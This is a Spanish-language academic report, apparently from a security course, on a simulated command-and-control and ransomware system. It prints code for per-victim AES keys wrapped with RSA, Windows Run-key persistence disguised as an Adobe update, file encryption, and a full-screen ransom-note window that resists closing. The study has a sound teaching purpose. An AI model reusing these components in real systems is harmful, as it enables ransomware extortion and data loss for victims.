# INFORME ACADÉMICO: Simulación de Amenaza Persistente Avanzada (APT) y C2
**Materia:** Seguridad Informática  
**Fecha:** Enero 2026

---

## 1. Introducción

El presente informe detalla el diseño, implementación y funcionamiento de una infraestructura de **Comando y Control (C2)** simulada, desarrollada con fines académicos para comprender las mecánicas detrás de las amenazas de tipo ransomware y malware moderno. El sistema se compone de tres elementos fundamentales: un servidor central (C2) basado en tecnología WebSocket, un cliente (malware) con capacidades de persistencia y cifrado, y una interfaz gráfica de extorsión (Ransom Note).

El objetivo es analizar técnicamente cómo opera el ciclo de vida de un ataque, desde la infección inicial y establecimiento de comunicaciones, hasta la gestión de claves criptográficas y el impacto en el sistema de la víctima.

---

## 2. Arquitectura del Sistema

El sistema sigue una arquitectura cliente-servidor asíncrona:

1.  **Servidor C2 (Node.js/Express):** Orquesta la comunicación, administra la base de datos de víctimas (Supabase) y gestiona las claves de cifrado (RSA/AES).
2.  **Cliente/Malware (Node.js/Pkg):** Se ejecuta en la máquina víctima, establece persistencia, reporta estado y ejecuta comandos remotos (cifrado, escaneo).
3.  **Interfaz de Usuario (Python/Tkinter):** Simula la pantalla de bloqueo de ransomware, mostrando el temporizador y las instrucciones de pago.

<!-- INSERTAR IMAGEN: Diagrama de arquitectura mostrando los 3 componentes y su interconexión -->
> *Figura 1: Diagrama de alto nivel de la arquitectura C2.*

---

## 3. Análisis Técnico del Servidor C2

El servidor actúa como el "cerebro" de la operación. Está construido sobre **Node.js** utilizando **Socket.io** para comunicaciones en tiempo real.

### 3.1. Gestión de Comunicaciones (Logging y Eventos)
El servidor mantiene un registro detallado de todas las actividades. A continuación se presenta la función encargada de normalizar y distribuir los logs tanto a la consola del atacante como al dashboard web.

**Código Fuente (`server.js`):**
```javascript
// Helper para loguear y enviar a dashboards
function logServer(msg, type = 'info') {
  // Auto-detectar tipo basado en contenido textual
  const lower = msg.toLowerCase();
  if (lower.includes('error') || lower.includes('fallo') || lower.includes('desconectado')) type = 'error';
  else if (lower.includes('registrado') || lower.includes('conectado') || lower.includes('exito')) type = 'success';
  else if (lower.includes('advertencia') || lower.includes('warning')) type = 'warning';
  
  // Limpiar mensaje (Tildes y espacios)
  let cleanMsg = msg
    .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remover tildes
    .replace(/^\s+/, ''); // Trim start

  console.log(cleanMsg);
  // Emitir evento WebSocket para actualizar dashboard en tiempo real
  io.emit('server-log', { msg: cleanMsg, type, timestamp: Date.now() });
}
```

**Análisis:**
La función `logServer` demuestra la capacidad de monitoreo en tiempo real. Utiliza expresiones regulares para limpiar el texto y categoriza automáticamente los eventos (error, éxito, advertencia) basándose en palabras clave, facilitando la visualización en el panel de control del atacante.

<!-- INSERTAR CAPTURA: Dashboard del C2 mostrando logs de conexiones de víctimas -->
> *Figura 2: Dashboard del C2 visualizando la actividad de los bots conectados.*

### 3.2. Gestión de Claves Criptográficas (AES + RSA)
La seguridad del esquema de extorsión reside en la gestión híbrida de claves. El servidor genera claves AES únicas por cliente y las protege (opcionalmente) con cifrado RSA asimétrico.

**Código Fuente (`server.js` - Generación de Claves):**
```javascript
function generarClaveCliente(clienteId, clienteName = null) {
  // Generar clave AES de 256 bits (32 bytes)
  const key = crypto.randomBytes(32).toString('hex'); 
  const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');

  // Cifrar con llave pública RSA para almacenamiento seguro
  let encryptedKey = '';
  try {
    if (rsaPublicKey) {
      const buffer = crypto.publicEncrypt(
        {
          key: rsaPublicKey,
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
        },
        Buffer.from(key, 'utf8') 
      );
      encryptedKey = buffer.toString('base64');
    }
  } catch (e) { console.log('Error encrypting AES key:', e.message); }

  // Persistencia en memoria y disco
  clavesPorCliente.set(clienteId, key);
  return { key, encryptedKey };
}
```

**Análisis:**
Este fragmento es crítico. Se utiliza `crypto.randomBytes(32)` para asegurar una entropía criptográfica fuerte para la clave AES-256. Adicionalmente, se implementa un mecanismo de "Cifrado de Clave" usando RSA (`crypto.publicEncrypt`). Esto simula un escenario real donde, incluso si el servidor es analizado por forenses, las claves de las víctimas solo podrían recuperarse si se posee la clave privada RSA del atacante.

---

## 4. Análisis del Cliente (Malware)

El cliente es un payload diseñado para ser sigiloso y resiliente. Sus funciones principales son garantizar su propia ejecución (persistencia) y realizar el cifrado de datos.

### 4.1. Mecanismo de Persistencia
El malware intenta sobrevivir a reinicios del sistema copiándose a carpetas del sistema y modificando el Registro de Windows.

**Código Fuente (`cliente.js`):**
```javascript
function instalarPersistencia() {
    return new Promise((resolve) => {
        const targetPath = path.join(INSTALL_DIR, EXE_NAME);
        
        // Agregar al registro de Windows (Run key)
        const REG_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
        const REG_VALUE = 'AdobeAcrobatUpdate'; // Disfrazado como update de Adobe
        
        const comando = `reg add "${REG_KEY}" /v "${REG_VALUE}" /t REG_SZ /d "${targetPath}" /f`;
        
        exec(comando, (error) => {
            if (error) {
                console.log('[!] No se pudo agregar al registro:', error.message);
            } else {
                console.log(' [+] Persistencia instalada en el registro');
            }
            resolve(true);
        });
    });
}
```

**Análisis:**
El código utiliza el comando nativo `reg add` para insertar una entrada en `HKCU\...\Run`. Esto asegura que el malware se ejecute automáticamente cada vez que el usuario inicia sesión. Se destaca el uso de Ingeniería Social en el nombre de la clave (`AdobeAcrobatUpdate`) para evadir la detección visual del usuario en el Administrador de Tareas.

<!-- INSERTAR CAPTURA: Editor del Registro (regedit) mostrando la clave maliciosa agregada -->
> *Figura 3: Clave de registro creada por el malware para persistencia.*

### 4.2. Motor de Cifrado AES-256
La función core del ransomware es el secuestro de información.

**Código Fuente (`cliente.js`):**
```javascript
function cifrarConAES(data, key) {
    const iv = crypto.randomBytes(16); // Vector de Inicialización aleatorio
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
    
    // Concatenar y cifrar
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
    
    return {
        encrypted: true,
        algorithm: 'aes-256-cbc',
        iv: iv.toString('hex'), // El IV se necesita para descifrar, se envía en claro
        data: encrypted.toString('base64')
    };
}
```

**Análisis:**
Se implementa el estándar `AES-256-CBC`. Es crucial notar el uso de un **IV (Vector de Inicialización)** único por cada operación (`crypto.randomBytes(16)`). Esto evita que dos archivos con el mismo contenido generen el mismo texto cifrado, dificultando el criptoanálisis.

---

## 5. Interfaz de Notificación (Ransom Note)

Para completar la simulación, se desarrolló una interfaz gráfica en **Python (Tkinter)** que bloquea la atención del usuario.

### 5.1. Diseño de la Interfaz Bloqueante
La aplicación se configura para ocupar toda la pantalla y mantenerse siempre visible ("Topmost").

**Código Fuente (`interfazdeaviso_tk.py`):**
```python
class VentanaCryptoLocker:
    def __init__(self, root, config):
        self.root = root
        # Configuración agresiva de ventana
        self.root.attributes('-fullscreen', True) # Pantalla completa
        self.root.attributes('-topmost', True)    # Siempre encima de otras ventanas
        self.root.overrideredirect(True)          # Sin bordes ni barra de título
        
        self.root.configure(bg='#8B0000') # Fondo rojo alarmante
        
        # Temporizador de cuenta regresiva
        self.total_seconds = (config['hours'] * 3600) + (config['minutes'] * 60)
        self.actualizar_timer()
```

**Análisis:**
El uso de `attributes('-topmost', True)` y `overrideredirect(True)` impide que el usuario cierre la ventana fácilmente (alt+f4 o botón cerrar). El diseño visual (fondo rojo `#8B0000`) y el temporizador en cuenta regresiva aplican presión psicológica, un componente estándar en ataques de ransomware.

<!-- INSERTAR CAPTURA: Pantalla completa roja con el temporizador y el logo de candado -->
> *Figura 4: Interfaz de la Nota de Rescate desplegada en la máquina víctima.*

---

## 6. Conclusiones

Este proyecto ha logrado simular con éxito la cadena de ataque completa de una amenaza C2 moderna.
1.  **Infraestructura Robusta:** El uso de Node.js permite manejar múltiples conexiones concurrentes de manera eficiente.
2.  **Persistencia Efectiva:** Las técnicas de modificación de registro demostraron ser eficaces para mantener el acceso.
3.  **Seguridad Operacional:** La implementación de cifrado híbrido y el almacenamiento de claves en base de datos externa (Supabase) aseguran que el atacante mantenga el control sobre la recuperación de los datos.

Este ejercicio académico resalta la importancia de monitorear cambios en el registro del sistema y el tráfico de red saliente hacia puertos no estándar o dominios desconocidos como medidas preventivas de defensa.
